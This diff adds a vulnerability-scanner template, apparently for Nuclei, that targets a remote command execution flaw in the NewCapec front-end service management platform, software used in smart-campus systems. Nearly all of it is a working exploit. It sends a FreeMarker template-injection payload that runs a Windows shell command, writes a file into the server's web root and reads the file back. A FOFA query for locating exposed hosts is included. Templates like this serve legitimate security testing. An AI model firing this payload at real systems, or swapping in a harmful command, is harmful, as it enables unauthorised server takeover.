@@ -1,0 +1,42 @@
+
+id: NewCapec-rce-service
+
+info:
+  name: NewCapec-rce-service
+  author: p1z 
+  severity: critical
+  description: |
+    新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E6%96%B0%E5%BC%80%E6%99%AE
+    - https://github.com/ibaiw/2023Hvv/blob/main/%E6%96%B0%E5%BC%80%E6%99%AE%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://blog.csdn.net/qq_41904294/article/details/131610861
+  metadata:
+    fofa-query: app="新开普-智慧校园系统"
+    hunter-query:
+    verified: true
+  tags: 2023,NewCapec,rce
+
+
+requests:
+  - raw:
+      - |
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+
+        {"command": "GetFZinfo","UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo hello1 >./webapps/ROOT/1nfo.txt\")}"}
+
+      - |
+        GET /1nfo.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - 'hello1'
